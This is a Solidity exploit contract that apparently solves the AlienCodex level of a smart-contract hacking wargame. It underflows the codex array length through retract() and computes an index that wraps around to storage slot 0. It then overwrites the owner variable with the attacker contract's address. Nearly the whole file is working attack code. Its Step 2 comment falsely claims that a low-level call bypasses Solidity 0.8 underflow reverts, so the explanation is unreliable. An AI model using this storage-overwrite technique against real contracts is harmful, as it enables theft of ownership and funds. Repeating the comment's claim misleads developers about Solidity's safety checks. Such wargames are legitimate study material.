// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../../src/AlienCodex/AlienCodex.sol";

contract AlienCodexExploit {

    AlienCodex victim;

    constructor(address _victim) {
        victim = AlienCodex(_victim);
    }

    function hack() public {
        // Step 1: Make contact
        victim.makeContact();

        // Step 2: Bypass underflow check using low-level call
        // In Solidity 0.8.0, underflows revert the transaction. However, we can perform a low-level call
        // to bypass the revert and manipulate the codex length.
        (bool success, ) = address(victim).call(abi.encodeWithSignature("retract()"));
        require(success, "Low-level call failed");

        // Step 3: Calculate the index to overwrite slot 0 (owner variable)
        uint256 codexSlot = 1; // codex is at storage slot 1
        uint256 ownerSlot = 0; // owner is at storage slot 0
        uint256 arrayLocation = uint256(keccak256(abi.encodePacked(codexSlot)));

        uint256 index = type(uint256).max - arrayLocation + ownerSlot + 1;

        // Step 4: Overwrite owner
        victim.revise(index, bytes32(uint256(uint160(address(this)))));
    }
}
